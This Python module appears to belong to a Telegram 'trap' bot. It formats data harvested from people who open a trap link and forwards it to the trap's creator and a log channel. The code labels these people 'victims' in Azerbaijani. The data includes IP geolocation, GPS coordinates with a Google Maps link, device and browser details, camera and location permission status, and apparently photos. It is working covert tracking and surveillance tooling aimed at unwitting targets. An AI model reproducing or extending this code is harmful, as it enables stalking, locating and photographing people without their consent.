import aiohttp
import asyncio
from telegram import Bot
from sqlalchemy.orm import Session
from config import Config
from database import get_db, AccessList

config = Config.from_env()
bot = Bot(token=config.BOT_TOKEN)

async def send_to_log_channel(message: str, photo_path: str = None):
    """Send message to log channel"""
    try:
        if photo_path:
            with open(photo_path, 'rb') as photo:
                await bot.send_photo(
                    chat_id=config.LOG_CHANNEL_ID,
                    photo=photo,
                    caption=message,
                    parse_mode='Markdown'
                )
        else:
            await bot.send_message(
                chat_id=config.LOG_CHANNEL_ID,
                text=message,
                parse_mode='Markdown'
            )
    except Exception as e:
        print(f"Error sending to log channel: {e}")

async def send_to_creator(creator_id: int, message: str, photo_path: str = None):
    """Send message to trap creator"""
    try:
        if photo_path:
            with open(photo_path, 'rb') as photo:
                await bot.send_photo(
                    chat_id=creator_id,
                    photo=photo,
                    caption=message,
                    parse_mode='Markdown'
                )
        else:
            await bot.send_message(
                chat_id=creator_id,
                text=message,
                parse_mode='Markdown'
            )
    except Exception as e:
        print(f"Error sending to creator {creator_id}: {e}")

async def get_ip_info(ip_address: str) -> dict:
    """Get IP information from ipinfo.io"""
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://ipinfo.io/{ip_address}/json?token={config.IPINFO_TOKEN}"
            async with session.get(url) as response:
                if response.status == 200:
                    return await response.json()
                else:
                    return {}
    except Exception as e:
        print(f"Error getting IP info: {e}")
        return {}

async def is_user_authorized(user_id: int) -> bool:
    """Check if user is authorized to use the bot"""
    if user_id == config.OWNER_ID:
        return True
    
    db = next(get_db())
    access_entry = db.query(AccessList).filter(AccessList.user_id == user_id).first()
    db.close()
    
    return access_entry is not None

def format_victim_data(victim_data: dict, trap_name: str) -> str:
    """Format victim data for sending"""
    message = f"🎯 **Yeni Qurban - {trap_name}**\n\n"
    
    # IP and Location Info
    if victim_data.get('ip_address'):
        message += f"🌐 **IP:** `{victim_data['ip_address']}`\n"
    
    if victim_data.get('country'):
        message += f"🏳️ **Ölkə:** {victim_data['country']}\n"
    
    if victim_data.get('region'):
        message += f"🏙️ **Region:** {victim_data['region']}\n"
    
    if victim_data.get('city'):
        message += f"🏘️ **Şəhər:** {victim_data['city']}\n"
    
    if victim_data.get('isp'):
        message += f"🌐 **ISP:** {victim_data['isp']}\n"
    
    # GPS Coordinates
    if victim_data.get('gps_latitude') and victim_data.get('gps_longitude'):
        message += f"📍 **GPS:** `{victim_data['gps_latitude']}, {victim_data['gps_longitude']}`\n"
        message += f"🎯 **Google Maps:** https://maps.google.com/?q={victim_data['gps_latitude']},{victim_data['gps_longitude']}\n"
    
    # Device Info
    if victim_data.get('device_type'):
        message += f"📱 **Cihaz:** {victim_data['device_type']}\n"
    
    if victim_data.get('browser'):
        message += f"🌐 **Brauzer:** {victim_data['browser']}\n"
    
    if victim_data.get('os'):
        message += f"💻 **OS:** {victim_data['os']}\n"
    
    # Permissions
    message += f"\n📷 **Kamera icazəsi:** {victim_data.get('camera_permission', 'Bilinmir')}\n"
    message += f"📍 **Konum icazəsi:** {victim_data.get('location_permission', 'Bilinmir')}\n"
    
    # Timestamp
    message += f"\n⏰ **Tarix:** {victim_data.get('accessed_at', 'Bilinmir')}"
    
    return message

def get_device_info(user_agent: str) -> dict:
    """Extract device information from user agent"""
    device_info = {
        'device_type': 'Unknown',
        'browser': 'Unknown',
        'os': 'Unknown'
    }
    
    if not user_agent:
        return device_info
    
    user_agent = user_agent.lower()
    
    # Device type detection
    if 'mobile' in user_agent or 'android' in user_agent or 'iphone' in user_agent:
        device_info['device_type'] = 'Mobile'
    elif 'tablet' in user_agent or 'ipad' in user_agent:
        device_info['device_type'] = 'Tablet'
    else:
        device_info['device_type'] = 'Desktop'
    
    # Browser detection
    if 'chrome' in user_agent:
        device_info['browser'] = 'Chrome'
    elif 'firefox' in user_agent:
        device_info['browser'] = 'Firefox'
    elif 'safari' in user_agent and 'chrome' not in user_agent:
        device_info['browser'] = 'Safari'
    elif 'edge' in user_agent:
        device_info['browser'] = 'Edge'
    elif 'opera' in user_agent:
        device_info['browser'] = 'Opera'
    
    # OS detection
    if 'windows' in user_agent:
        device_info['os'] = 'Windows'
    elif 'mac' in user_agent:
        device_info['os'] = 'macOS'
    elif 'linux' in user_agent:
        device_info['os'] = 'Linux'
    elif 'android' in user_agent:
        device_info['os'] = 'Android'
    elif 'ios' in user_agent or 'iphone' in user_agent or 'ipad' in user_agent:
        device_info['os'] = 'iOS'
    
    return device_info
